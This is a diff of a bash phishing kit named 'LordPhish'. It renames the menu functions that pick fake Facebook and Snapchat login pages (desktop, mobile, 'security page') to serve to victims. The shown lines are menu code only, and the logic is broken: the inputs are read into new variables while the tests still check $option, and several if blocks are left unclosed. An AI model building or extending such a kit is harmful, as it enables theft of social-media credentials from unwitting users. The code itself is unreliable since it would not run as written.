@@ -74,7 +74,7 @@ start
 
 elif [[ $option == 2 ]]; then
 server="facebook"
-listfb
+list_fb
 
 elif [[ $option == 3 ]]; then
 server="snapchat"
@@ -321,17 +321,17 @@ printf "     \e[101m\e[1;77m:: Attacking targets without mutual consent is illeg
 printf "\n"
 }
 
-listfb() {
+list_fb() {
     clear
     banner
     printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Facebook desktop\e[0m\n"
     printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Facebook mobile\e[0m\n"
-    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' 
+    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' list_fb
 if [[ $option == 1 ]]; then
-lfbdesk
+l_fbdesk
 
 if [[ $option == 2 ]]; then
-lfbmob
+l_fbmob
 
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
@@ -339,12 +339,12 @@ menu
 fi
 }
 
-lfbdesk() {
+l_fbdesk() {
  clear
  banner
  printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Facebook page\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Facebook Statisc\e[0m\n"
- read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en'
+ read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' l_fbdesk
  
 if [[ $option == 1 ]]; then
 server="face_desk"
@@ -360,12 +360,12 @@ menu
 fi
 }
 
-lfbmob() {
+l_fbmob() {
  clear
  banner
  printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Facebook Page\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Facebook Security Page\e[0m\n"
- read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en'
+ read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' l_fbmob
  
 if [[ $option == 1 ]]; then
 server="face_moobileP"
